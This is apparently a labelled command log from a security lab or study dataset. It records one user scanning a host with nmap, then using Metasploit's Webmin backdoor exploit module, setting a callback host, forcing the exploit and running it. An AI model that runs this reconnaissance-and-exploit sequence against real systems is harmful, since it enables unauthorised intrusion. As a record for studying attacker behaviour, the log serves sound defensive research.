User 91 start time 1594804270 end 1594805475
PADDING
PADDING
PADDING
INPUT|91--0|U|1594804270|91|nmap -h|OUTPUT
INPUT|91--1|U|1594804270|91|nmap -h|OUTPUT
INPUT|91--2|M0 |1594804337|91|nmap -p 1-65535 172.18.1.5|OUTPUT
INPUT|91--3|M1 |1594804451|91|nmap -A -p 10000 172.18.1.5|OUTPUT
INPUT|91--4|M2 |1594804764|91|msfconsole|OUTPUT
INPUT|91--5|A4|1594804830|91|use exploit/linux/http/webmin_backdoor|OUTPUT
INPUT|91--6|A4|1594805174|91|use exploit/unix/http/webmin_backdoor|OUTPUT
INPUT|91--7|M3 |1594805205|91|search webmin|OUTPUT
INPUT|91--8|M4 |1594805249|91|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|91--9|M5 |1594805252|91|show options|OUTPUT
INPUT|91--10|A6|1594805282|91|set lhost 10.1.135.83|OUTPUT
INPUT|91--11|A6|1594805304|91|set rhosts 172.18.1.5|OUTPUT
INPUT|91--12|U|1594805322|91|show targets|OUTPUT
INPUT|91--13|U|1594805336|91|show options|OUTPUT
INPUT|91--14|M8 |1594805359|91|exploit |OUTPUT
INPUT|91--15|A6|1594805389|91|set srvhost 10.1.135.83|OUTPUT
INPUT|91--16|U|1594805412|91|exploit |OUTPUT
INPUT|91--17|U|1594805422|91|show options|OUTPUT
INPUT|91--18|A6|1594805452|91|set ForceExplot|OUTPUT
INPUT|91--19|A6|1594805458|91|set ForceExploit|OUTPUT
INPUT|91--20|A6|1594805464|91|set ForceExploit true|OUTPUT
INPUT|91--21|U|1594805475|91|exploit|OUTPUT
